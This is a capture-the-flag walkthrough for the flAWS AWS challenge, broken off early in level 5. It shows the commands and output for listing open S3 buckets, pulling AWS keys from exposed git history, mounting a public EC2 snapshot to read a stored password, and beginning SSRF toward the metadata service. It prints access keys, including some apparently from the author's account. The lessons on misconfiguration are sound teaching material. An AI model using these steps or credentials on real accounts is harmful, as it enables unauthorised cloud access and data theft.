![flAWS](https://github.com/GTekSD/SUASS/assets/55411358/a472fb4b-c7cc-4731-ab40-a56bcfaf6a99)

## Welcome to the [flAWS](http://flaws.cloud) challenge!

 - [Level 1](#level-1) üîó http://flaws.cloud/
 - [Level 2](#level-2) üîó http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
 - [Level 3](#level-3) üîó http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
 - [Level 4](#level-4) üîó http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
 - [Level 5](#level-5) üîó http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
 - [Level 6](#level-6) üîó http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud 
-------------------

# Level 1
This level is *buckets* of fun. http://flaws.cloud/

The site flaws.cloud is hosted as an S3 bucket. This is a great way to host a static site, similar to hosting one via github pages. Some interesting facts about S3 hosting: When hosting a site as an S3 bucket, the bucket name (flaws.cloud) must match the domain name (flaws.cloud). Also, S3 buckets are a global name space, meaning two people cannot have buckets with the same name. The result of this is we could create a bucket named apple.com and Apple would never be able host their main site via S3 hosting.

We can determine the site is hosted as an S3 bucket by running a DNS lookup on the domain, such as: 
```
‚îî‚îÄ$ nslookup Flaws.cloud
```
```
Non-authoritative answer:
Name:   flaws.cloud
Address: 52.218.181.18
Name:   flaws.cloud
Address: 52.218.152.106
Name:   flaws.cloud
Address: 52.92.186.75
Name:   flaws.cloud
Address: 52.92.195.211
Name:   flaws.cloud
Address: 52.218.213.58
Name:   flaws.cloud
Address: 52.218.217.26
Name:   flaws.cloud
Address: 52.92.139.115
Name:   flaws.cloud
Address: 52.92.249.3
```
We can then run: 
```
‚îî‚îÄ$ nslookup 52.218.181.18
```
```
18.181.218.52.in-addr.arpa      name = s3-website-us-west-2.amazonaws.com.

Authoritative answers can be found from:
```
So we know it's hosted in the AWS region us-west-2 s3 bucket.
flaws.cloud can also be visited by going to http://flaws.cloud.s3-website-us-west-2.amazonaws.com/ 

We now know that they have a bucket named `flaws.cloud` in `us-west-2`, so we can attempt to browse the bucket by using the aws cli by running: 
```
‚îî‚îÄ$ aws s3 ls s3://flaws.cloud
```
```

Unable to locate credentials. You can configure credentials by running "aws configure".
```

Let's try adding --no-sign-request
```
‚îî‚îÄ$ aws s3 ls s3://flaws.cloud --no-sign-request
```
```
2017-03-14 08:30:38       2575 hint1.html
2017-03-03 09:35:17       1707 hint2.html
2017-03-03 09:35:11       1101 hint3.html
2020-05-22 23:46:45       3162 index.html
2018-07-10 22:17:16      15979 logo.png
2017-02-27 07:29:28         46 robots.txt
2017-02-27 07:29:30       1051 secret-dd02c7c.html
```
BOOM!!!
Let's Download this secret using this command:
```
‚îî‚îÄ$ aws s3 cp s3://flaws.cloud/secret-dd02c7c.html --no-sign-request secret.html
```
```
download: s3://flaws.cloud/secret-dd02c7c.html to ./secret.html
```
and Open it
```
‚îî‚îÄ$ open secret.html
```
```
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|

Congrats! You found the secret file!
Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
```

### Lesson learned
On AWS you can set up S3 buckets with all sorts of permissions and functionality including using them to host static files. A number of people accidentally open them up with permissions that are too loose. Just like how you shouldn't allow directory listings of web servers, you shouldn't allow bucket listings.
#### Examples of this problem
- Directory listing of S3 bucket of [Legal Robot](https://hackerone.com/reports/163476) and [Shopify](https://hackerone.com/reports/57505).
- Read and write permissions to S3 bucket for [Shopify again](https://hackerone.com/reports/111643) and [Udemy](https://hackerone.com/reports/131468). This challenge did not have read and write permissions, as that would destroy the challenge for other players, but it is a common problem. 

### Avoiding the mistake
By default, S3 buckets are private and secure when they are created. To allow it to be accessed as a web page, I had turn on "Static Website Hosting" and changed the bucket policy to allow everyone "s3:GetObject" privileges, which is fine if you plan to publicly host the bucket as a web page. But then to introduce the flaw, I changed the permissions to add "Everyone" to have "List" permissions. "Everyone" means everyone on the Internet. You can also list the files simply by going to http://flaws.cloud.s3.amazonaws.com/ due to that List permission. 

This screenshot is from the webconsole in 2017.

![image-permissions](https://github.com/GTekSD/SUASS/assets/55411358/636608b2-f2d2-4805-8dd0-7312a75aa825)

This screenshot is from the webconsole in 2024.

![Everyone-2024](https://github.com/GTekSD/SUASS/assets/55411358/e2d715f9-7ce3-410e-b249-d942fef04d8d)

--------------------

# Level 2
Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud

This level is fairly similar, with a slight twist. we're going to need our own AWS account for this. we just need the free tier. 

Create a IAM user with permissions of "AmazonS3FullAccess" and create a access keys for AWS Cli.

We need our own AWS key, and we need to use the AWS CLI. Similar to the first level, we can discover that this sub-domain is hosted as an S3 bucket with the name "level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud".

By using this command, we're letting the CLI know which set of credentials it should use when accessing AWS resources.
```
‚îî‚îÄ$ aws configure --profile gteksd
```
```
AWS Access Key ID [None]: AKIAZ34HBEFSHI4VJEP4F
AWS Secret Access Key [None]: //YlybQlLErQz0gsdfvktUYG4l5WDFQAXNfzvhUz
Default region name [None]: 
Default output format [None]: 
```

Its permissions are too loose, but we need our own AWS account to see what's inside. Using our own account we can run: 
```
‚îî‚îÄ$ aws s3 ls --profile gteksd s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
```
```
2017-02-27 07:32:15      80751 everyone.png
2017-03-03 09:17:17       1433 hint1.html
2017-02-27 07:34:39       1035 hint2.html
2017-02-27 07:32:14       2786 index.html
2017-02-27 07:32:14         26 robots.txt
2017-02-27 07:32:15       1051 secret-e4443fc.html
```

BOOM!!!
Let's save the secret2 file.
```
‚îî‚îÄ$ aws s3 cp --profile gteksd s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html secret2.html
```
```
download: s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html to ./secret2.html
```

```
‚îî‚îÄ$ open secret2.html
```
```
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|

Congrats! You found the secret file!
Level 3 is at http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
```

### Lesson learned
Similar to opening permissions to "Everyone", people accidentally open permissions to "Any Authenticated AWS User". They might mistakenly think this will only be users of their account, when in fact it means anyone that has an AWS account.

### Examples of this problem
- Open permissions for authenticated AWS user on Shopify (link) 

### Avoiding the mistake
Only open permissions to specific AWS users. This screenshot is from the webconsole in 2017.

![Permissions-2017](https://github.com/GTekSD/SUASS/assets/55411358/e0ac40e8-1a8b-485c-a2f4-966f196a1c97)

This screenshot is from the webconsole in 2024.

![Permissions-2024](https://github.com/GTekSD/SUASS/assets/55411358/2ed85f34-017e-46f9-873f-e8f9074aae71)

--------------------

# Level 3
Level 3 is at http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud

Like the first level, we should have figured out how to list the files in this directory, and seen that listing in this bucket is open to "Everyone". See the file listing at level3-9afd3927f195e10225021a578e6f78df.flaws.cloud.s3.amazonaws.com
```
‚îî‚îÄ$ aws s3 ls --profile gteksd s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
```
```
                           PRE .git/
2017-02-27 05:44:33     123637 authenticated_users.png
2017-02-27 05:44:34       1552 hint1.html
2017-02-27 05:44:34       1426 hint2.html
2017-02-27 05:44:35       1247 hint3.html
2017-02-27 05:44:33       1035 hint4.html
2020-05-22 23:51:10       1861 index.html
2017-02-27 05:44:33         26 robots.txt
```

This S3 bucket has a .git file. There are probably interesting things in it. Download this whole S3 bucket using: 

```
‚îî‚îÄ$ aws s3 sync --profile gteksd s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud ./flAWS-L3
```
```
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/post-update.sample to flAWS-L3/.git/hooks/post-update.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/config to flAWS-L3/.git/config                                                                  
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/COMMIT_EDITMSG to flAWS-L3/.git/COMMIT_EDITMSG                                                  
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/HEAD to flAWS-L3/.git/HEAD                                                                      
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/description to flAWS-L3/.git/description                                                        
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-commit.sample to flAWS-L3/.git/hooks/pre-commit.sample                                
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-applypatch.sample to flAWS-L3/.git/hooks/pre-applypatch.sample                        
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/applypatch-msg.sample to flAWS-L3/.git/hooks/applypatch-msg.sample                                                
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/commit-msg.sample to flAWS-L3/.git/hooks/commit-msg.sample                                                        
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-rebase.sample to flAWS-L3/.git/hooks/pre-rebase.sample                                                        
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/prepare-commit-msg.sample to flAWS-L3/.git/hooks/prepare-commit-msg.sample                                                                        
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/index to flAWS-L3/.git/index                                                                                                                            
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df to flAWS-L3/.git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df                                    
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/info/exclude to flAWS-L3/.git/info/exclude                                                                                                              
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/logs/refs/heads/master to flAWS-L3/.git/logs/refs/heads/master                                                                                          
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c to flAWS-L3/.git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c                                    
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/update.sample to flAWS-L3/.git/hooks/update.sample                                                                                                
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c to flAWS-L3/.git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c                                    
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b to flAWS-L3/.git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b                                    
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/c2/aab7e03933a858d1765090928dca4013fe2526 to flAWS-L3/.git/objects/c2/aab7e03933a858d1765090928dca4013fe2526                                    
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2 to flAWS-L3/.git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2                                    
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25 to flAWS-L3/.git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/logs/HEAD to flAWS-L3/.git/logs/HEAD
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2 to flAWS-L3/.git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/refs/heads/master to flAWS-L3/.git/refs/heads/master
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint1.html to flAWS-L3/hint1.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61 to flAWS-L3/.git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/f2/a144957997f15729d4491f251c3615d508b16a to flAWS-L3/.git/objects/f2/a144957997f15729d4491f251c3615d508b16a
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 to flAWS-L3/.git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint2.html to flAWS-L3/hint2.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/robots.txt to flAWS-L3/robots.txt
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/index.html to flAWS-L3/index.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint3.html to flAWS-L3/hint3.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint4.html to flAWS-L3/hint4.html
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/76/e4934c9de40e36f09b4e5538236551529f723c to flAWS-L3/.git/objects/76/e4934c9de40e36f09b4e5538236551529f723c
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png to flAWS-L3/authenticated_users.png
```

Let's search this bucket.
```
‚îî‚îÄ$ cd .git
```
```
‚îî‚îÄ$ cat logs/refs/heads/master
```
```
0000000000000000000000000000000000000000 f52ec03b227ea6094b04e43f475fb0126edb5a61 0xdabbad00 <scott@summitroute.com> 1505661007 -0600   commit (initial): first commit
f52ec03b227ea6094b04e43f475fb0126edb5a61 b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 0xdabbad00 <scott@summitroute.com> 1505661043 -0600   commit: Oops, accidentally added something I shouldn't have
```

People often accidentally add secret things to git repos, and then try to remove them without revoking or rolling the secrets. You can look through the history of a git repo by running: 
```
‚îî‚îÄ$ git log                               
```
```
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit
```

Then you can look at what a git repo looked like at the time of a commit by running: 
```
‚îî‚îÄ$ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
```
where `f7cebc46b471ca9838a0bdd1074bb498a3f84c87` would be the hash for the commit shown in `git log`.
```
M       index.html
Note: switching to 'f52ec03b227ea6094b04e43f475fb0126edb5a61'.

You are in 'detached HEAD' state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may do so (now or later) by using -c with the switch command.
Example:
  git switch -c <new-branch-name>

Or undo this operation with:
  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at f52ec03 first commit
                                      
```

```
‚îî‚îÄ$ cat access_keys.txt
```
```
access_key AKIAJ366LIPB4IJKT7SA
secret_access_key OdNa7m+bqUvF3Bn/qgSnPE1kBpqcBTTjqwP83Jys
```
We should have found the AWS key and secret. 

We can configure your aws command to use it and create a profile for it using: 
```
‚îî‚îÄ$ aws configure --profile sike  
```
```
AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7SA
AWS Secret Access Key [None]: OdNa7m+bqUvF3Bn/qgSnPE1kBpqcBTTjqwP83Jys
Default region name [None]: 
Default output format [None]: 
```

Then to list S3 buckets using that profile run: 
```
‚îî‚îÄ$ aws s3 ls --profile sike
```
```
2017-02-13 03:01:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 22:04:53 config-bucket-975426262029
2017-02-13 01:33:24 flaws-logs
2017-02-05 09:10:07 flaws.cloud
2017-02-24 07:24:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 23:45:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 23:46:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-27 01:14:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-27 01:17:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-27 01:36:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

### Lesson learned
People often leak AWS keys and then try to cover up their mistakes without revoking the keys. You should always revoke any AWS keys (or any secrets) that could have been leaked or were misplaced. Roll your secrets early and often.

#### Examples of this problem
- [Instagram's Million Dollar Bug](http://www.exfiltrated.com/research-Instagram-RCE.php): In this must read post, a bug bounty researcher uncovered a series of flaws, including finding an S3 bucket that had .tar.gz archives of various revisions of files. One of these archives contained AWS creds that then allowed the researcher to access all S3 buckets of Instagram. For more discussion of how some of the problems discovered could have been avoided, see the post ["Instagram's Million Dollar Bug": Case study for defense ](https://summitroute.com/blog/2015/12/24/instagram_bounty_case_study_for_defense/)

Another interesting issue this level has exhibited, although not that worrisome, is that you can't restrict the ability to list only certain buckets in AWS, so if you want to give an employee the ability to list some buckets in an account, they will be able to list them all. The key you used to discover this bucket can see all the buckets in the account. You can't see what is in the buckets, but you'll know they exist. Similarly, be aware that buckets use a global namespace meaning that bucket names must be unique across all customers, so if you create a bucket named `merger_with_company_Y` or something that is supposed to be secret, it's technically possible for someone to discover that bucket exists.

### Avoiding this mistake
Always roll your secrets if you suspect they were compromised or made public or stored or shared incorrectly. Roll early, roll often. Rolling secrets means that you revoke the keys (ie. delete them from the AWS account) and generate new ones. 

--------------------

# Level 4
For the next level, We need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud

It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it. 

We can snapshot the disk volume of an EC2 as a backup. In this case, the snapshot was made public, but we'll need to find it.

To do this, first we need the account ID, which we can get using the AWS key from the previous level: 
```
aws --profile sike sts get-caller-identity
```
```
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
```

Using that command also tells you the name of the account, which in this case is named "backup". The backups this account makes are snapshots of EC2s. Next, discover the snapshot: 
```
aws --profile sike ec2 describe-snapshots --owner-id 975426262029
```
```
You must specify a region. You can also configure your region by running "aws configure".
```

To identify a region, we need to run nslookup on domain.
```
‚îî‚îÄ$ nslookup level4-1156739cfb264ced6de514971a4bef68.flaws.cloud           
```
```
Server:         8.8.8.8
Address:        8.8.8.8#53

Non-authoritative answer:
Name:   level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
Address: 52.92.145.91
Name:   level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
Address: 52.92.209.203
Name:   level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
Address: 52.218.246.122
Name:   level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
```
and now on ip:
```
‚îî‚îÄ$ nslookup 52.92.145.91 && nslookup 52.92.209.203 
```
```
91.145.92.52.in-addr.arpa       name = s3-website-us-west-2.amazonaws.com.

203.209.92.52.in-addr.arpa      name = s3-website-us-west-2.amazonaws.com.
```
We have identify that this snapshot is in us-west-2 region.

Now configure us-west-2 region.
```
‚îî‚îÄ$ aws configure --profile sike
```
```
AWS Access Key ID [****************T7SA]: 
AWS Secret Access Key [****************3Jys]: 
Default region name [None]: us-west-2
Default output format [None]: 
```
We specify the owner-id just to filter the output. 
```
‚îî‚îÄ$ aws --profile sike ec2 describe-snapshots --owner-id 975426262029
```
```
{
    "Snapshots": [
        {
            "Description": "",
            "Encrypted": false,
            "OwnerId": "975426262029",
            "Progress": "100%",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "StartTime": "2017-02-28T01:35:12+00:00",
            "State": "completed",
            "VolumeId": "vol-04f1c039bc13ea950",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ],
            "StorageTier": "standard"
        }
    ]
}

```
For fun, run that command without the owner-id and notice all the snapshots that are publicy readable. By default snapshots are private, and you can transfer them between accounts securely by specifiying the account ID of the other account, but a number of people just make them public and forget about them it seems.

Now that you know the snapshot ID, we're going to want to mount it. we'll need to do this in our own AWS account.

First, create a volume using the snapshot: 

Note:  Configure IAM user with permissions of "AdministratorAccess" under (IAM > Users > gteksds3hacker > Add permissions > Attach policies directly > Permissions policies)
```
‚îî‚îÄ$ aws --profile gteksd ec2 create-volume --availability-zone us-west-2b --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89
```
```
{
    "AvailabilityZone": "us-west-2b",
    "CreateTime": "2024-02-15T07:51:19+00:00",
    "Encrypted": false,
    "Size": 8,
    "SnapshotId": "snap-0b49342abd1bdcb89",
    "State": "creating",
    "VolumeId": "vol-070719fc38dfc071e",
    "Iops": 100,
    "Tags": [],
    "VolumeType": "gp2",
    "MultiAttachEnabled": false
}
```
Now in the console we have to create an EC2 (I prefer ubuntu, but any linux will do) in the us-west-2 region and in the storage options, choose the volume you just created.

After logs into your AWS console, Click on Services from the menu bar, and search for EC2. From the search results, click on EC2 Virtual Servers in the Cloud.

Once the EC2 Service Console page opens, Select region US West (Oregon) from top right corner.

![1](https://github.com/GTekSD/SUASS/assets/55411358/0ee97975-2193-40e3-9aa4-6ff38e4237dd)

Now, Click on "Launch instance" to create new instance.

![2](https://github.com/GTekSD/SUASS/assets/55411358/8262a8ff-f800-41c0-abce-e7900434c13b)

Once the Launch an instance page opens, Type name "flaws-os" under Name and tags. Select Free tier eligible Ubuntu AMI.

![3](https://github.com/GTekSD/SUASS/assets/55411358/f3fab0d6-3326-47ea-a3a2-9fbb47d9fc06)

![4](https://github.com/GTekSD/SUASS/assets/55411358/2e18a4cc-0f05-47d5-8586-f9539f9b8d13)

Scroll down and click on "Create new key pair" under Key pair.

![5](https://github.com/GTekSD/SUASS/assets/55411358/af05499d-bd44-4460-b488-c1ebc08c2c79)

Enter Key pair name (gteksd-flaws-key), select ED25S19 Key pair type, select .pem Private key file format and click on Create key pair.

![6](https://github.com/GTekSD/SUASS/assets/55411358/7b9aa29e-1d1e-41ad-a1cd-e93e1b9e12a8)

Now, the .pem file (gteksd-fIaws-key.pem) will be downloaded, Click on Launch instance.

![7](https://github.com/GTekSD/SUASS/assets/55411358/46f16122-4c3f-4b74-92aa-8a57dcd9798b)

Click on the instance ID in Success notification.

![8](https://github.com/GTekSD/SUASS/assets/55411358/4427783a-1974-49de-9be4-e080d2eab8ea)

Check and Verify the Availability Zone, it must be us-west-2b.

![9](https://github.com/GTekSD/SUASS/assets/55411358/46b90774-ca1a-4c4b-b392-3d287525e296)

Now, Click on Volumes under Elastic Block Store.

![10](https://github.com/GTekSD/SUASS/assets/55411358/e10e6870-4c0d-46e3-abbb-a2d6d472f391)

Compair and Click on the volume which we created in previous command `"VolumeId": "vol-070719fc38dfc071e",`

![11](https://github.com/GTekSD/SUASS/assets/55411358/434d099d-22b6-4379-a77c-647d9cbe3bf0)

Now, To attach volume to our launched ubuntu instance, Click on Actions and select Attach volume.

![12](https://github.com/GTekSD/SUASS/assets/55411358/972aaef9-f77a-42c0-91fc-47935c50766d)

Select our launched instance (flaws-os) under Instance, and click on Attach volume.

![13](https://github.com/GTekSD/SUASS/assets/55411358/71ef81e0-c46a-4394-a4b5-8526f6a803ee)

Now, We'll see the successfully attached volume vol to inst notification.

![14](https://github.com/GTekSD/SUASS/assets/55411358/448d4c2a-2eff-4177-b5b9-923f5c023460)

Now, We need to Copy public IPv4 address to clipboard, Come back to our Instances page under Instances, check instance (flaws-os) and copy the Public IPv4 address from below pannel.

![15 cpip](https://github.com/GTekSD/SUASS/assets/55411358/70bae0d2-0192-4c35-a21e-59fe80e149e8)


```
‚îî‚îÄ$ chmod 400 gteksd-flaws-key.pem
```

SSH in with something like:
```
‚îî‚îÄ$ ssh ubuntu@54.189.161.23 -i gteksd-flaws-key.pem
```
```
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-1017-aws x86_64)
```

We'll need to mount this extra volume by running: 

Let's list the available volume information by hitting `lsblk`
```
ubuntu@ip-172-31-28-181:~$ lsblk
```
```
NAME     MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
loop0      7:0    0  24.9M  1 loop /snap/amazon-ssm-agent/7628
loop1      7:1    0  55.7M  1 loop /snap/core18/2812
loop2      7:2    0  63.5M  1 loop /snap/core20/2015
loop3      7:3    0 111.9M  1 loop /snap/lxd/24322
loop4      7:4    0  40.9M  1 loop /snap/snapd/20290
loop5      7:5    0  40.4M  1 loop /snap/snapd/20671
loop6      7:6    0  63.9M  1 loop /snap/core20/2105
loop7      7:7    0    87M  1 loop /snap/lxd/27037
xvda     202:0    0     8G  0 disk 
‚îú‚îÄxvda1  202:1    0   7.9G  0 part /
‚îú‚îÄxvda14 202:14   0     4M  0 part 
‚îî‚îÄxvda15 202:15   0   106M  0 part /boot/efi
xvdf     202:80   0     8G  0 disk 
‚îî‚îÄxvdf1  202:81   0     8G  0 part
```

Let's mount our attached volume:
```
ubuntu@ip-172-31-28-181:~$ sudo mount /dev/xvdf1 /mnt
```
```shell
ubuntu@ip-172-31-28-181:~$ cd /mnt/
ubuntu@ip-172-31-28-181:/mnt$ ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
```

Now, we'll have to look around for something that might tell us the password. 
```
ubuntu@ip-172-31-28-181:~$ cd /mnt/home/ubuntu/
ubuntu@ip-172-31-28-181:/mnt/home/ubuntu$ ls
meta-data  setupNginx.sh
```

In the ubuntu user's home directory is the file: `/home/ubuntu/setupNginx.sh`
```
ubuntu@ip-172-31-28-181:/mnt/home/ubuntu$ cat setupNginx.sh
```
```
htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
```
HA GOT'EEEEMM!!!! That is the username and password for the user. Enter those at http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud

```
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|

flAWS - Level 5
Good work getting in. This level is described at http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/
```

### Lesson learned
AWS allows you to make snapshots of EC2's and databases (RDS). The main purpose for that is to make backups, but people sometimes use snapshots to get access back to their own EC2's when they forget the passwords. This also allows attackers to get access to things. Snapshots are normally restricted to your own account, so a possible attack would be an attacker getting access to an AWS key that allows them to start/stop and do other things with EC2's and then uses that to snapshot an EC2 and spin up an EC2 with that volume in your environment to get access to it. Like all backups, you need to be cautious about protecting them. 

--------------------

# Level 5
This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage:
- http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/
- http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml
- http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/ 

Let's see if we can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it. 

On cloud services, including AWS, the IP 169.254.169.254 is magical. It's the metadata service.

There is an RFC on it ([RFC-3927](https://datatracker.ietf.org/doc/html/rfc3927)), but you should read the AWS specific docs on it [here](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html). 

From the description we know that this link points to a proxy service operated on an EC2 instance. We can ask it to fetch any website for us by appending the URL to the ‚Äúproxy‚Äù endpoint and terminating with a ‚Äú/‚Äù.

Our goal is to get access to a [bucket](http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/) with a hidden directory. Most likely we have to find some credentials with permissions to access to it.

#### Exploring the proxy:

That was just the description. Let‚Äôs test the proxy to see if it works as promised. To do so, fetch the (HTTP) homepage of Google both directly and via the proxy. Here is the direct request (I show only a few headers):
```
‚îî‚îÄ$ curl -i http://google.com
```
```
HTTP/1.1 301 Moved Permanently
Location: http://www.google.com/
Server: gws
```

We receive a 301 redirecting to the HTTPS-version of the site. The server header is ‚Äúgws‚Äù, which is the name Google‚Äôs proprietary web server uses ([Google Web Server](https://en.wikipedia.org/wiki/Google_Web_Server)). Now request the site via the proxy:
```
